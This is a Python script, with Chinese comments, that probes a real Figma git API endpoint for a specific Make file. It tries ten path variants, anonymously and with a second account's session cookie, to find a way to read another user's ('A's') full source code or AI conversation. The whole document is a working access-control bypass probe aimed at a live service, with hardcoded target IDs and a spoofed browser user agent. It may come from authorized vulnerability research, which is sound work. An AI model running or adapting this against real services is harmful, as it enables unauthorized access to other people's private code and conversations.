# -*- coding: utf-8 -*-
"""make 文件 git 仓库访问矩阵: 匿名/B cookie × 多路径变体
目标: 找到可读取 A 的 make 文件源码的路径 (完整源码泄露 > AI对话)
"""
import io, sys, urllib.error, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

GIT_BASE = "https://api.figma.com/git/make/file/2386353361958857999"
REPO = "public/code/7e8f327c-edcf-45e4-a11a-2a3d85c686c3"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"
BC = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')

VARIANTS = [
    f"/{REPO}.git/info/refs?service=git-upload-pack",
    f"/{REPO}/info/refs?service=git-upload-pack",
    f"/{REPO}.git/HEAD",
    f"/{REPO}/HEAD",
    f"/{REPO}.git/",
    f"/{REPO}",
    f"/public/{REPO.split('/')[-1]}.git/info/refs?service=git-upload-pack",
    f"/code/{REPO.split('/')[-1]}.git/info/refs?service=git-upload-pack",
    "/public/code/info/refs?service=git-upload-pack",
    f"/{REPO}.git/config",
]


def git_call(label, path, cookie=None):
    headers = {"User-Agent": UA, "Accept": "*/*",
               "Git-Protocol": "version=2",
               "Pragma": "no-cache", "Cache-Control": "no-cache"}
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(GIT_BASE + path, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            raw = r.read().decode(errors='replace')
            print(f"[{label}] {r.status} len={len(raw)} :: {raw[:200]}")
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] {e.code} :: {raw[:200]}")


print("======== 匿名 ========")
for v in VARIANTS:
    git_call("anon " + v[:60], v)
    print()

print("\n======== B cookie ========")
for v in VARIANTS[:5]:
    git_call("B " + v[:60], v, cookie=BC)
    print()
